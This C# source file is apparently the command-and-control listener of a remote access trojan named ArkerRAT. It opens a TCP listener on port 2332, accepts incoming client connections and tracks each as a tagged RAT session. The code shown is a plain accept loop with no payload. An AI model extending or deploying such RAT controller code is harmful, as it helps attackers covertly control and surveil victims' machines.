using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System;
using System.Windows;

namespace ArkerRAT1
{
    static class ArkerRATServerMechanics
    {
        static MainWindow mainWindow = new MainWindow();
        public static int port = 2332;
        static TcpListener listener = new TcpListener(IPAddress.Any, port);
       
        public static List<RATHostSession> RATClients = new List<RATHostSession>();
        
        static bool serverIsRunning = false;

        //A tag number will be used to diffrenciate the RATHostSession objects from eachother. 
        static int tag = 1;

        public static async Task StartServer()
        {
            serverIsRunning = true;
            listener.Start();
            MessageBox.Show("Listening SUCCESSFULY started on port " + port);

            while (serverIsRunning)
            {
                tag++;
                
                //Tag haas to be in string formate to work.
                string tagText = Convert.ToString(tag);
                TcpClient client = await listener.AcceptTcpClientAsync();
                RATHostSession clientSession = new RATHostSession(client, tagText);
                RATClients.Add(clientSession);
            }
        }

        public static void StopListener()
        {
            serverIsRunning=false;
            listener.Stop();
        }
    }
}
